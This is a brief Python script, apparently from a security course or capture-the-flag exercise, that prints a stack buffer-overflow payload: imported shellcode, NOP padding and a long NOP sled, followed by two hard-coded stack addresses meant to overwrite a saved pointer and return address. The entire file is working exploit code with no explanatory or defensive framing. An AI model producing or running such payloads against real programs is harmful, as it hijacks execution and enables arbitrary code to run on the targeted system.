from shellcode import shellcode
import sys
if __name__ == "__main__":
    sys.stdout.buffer.write(shellcode +  #53 long
    b"\x90\x90\x90" + #pad to 56 using nop, multiple of 4
    b"\x90" * 1992 + # 1992
    b"\x68\xd0\xf6\xff" + # we want 0xfff6d068
    b"\x7c\xd8\xf6\xff")  # we want 0xfff6d87c
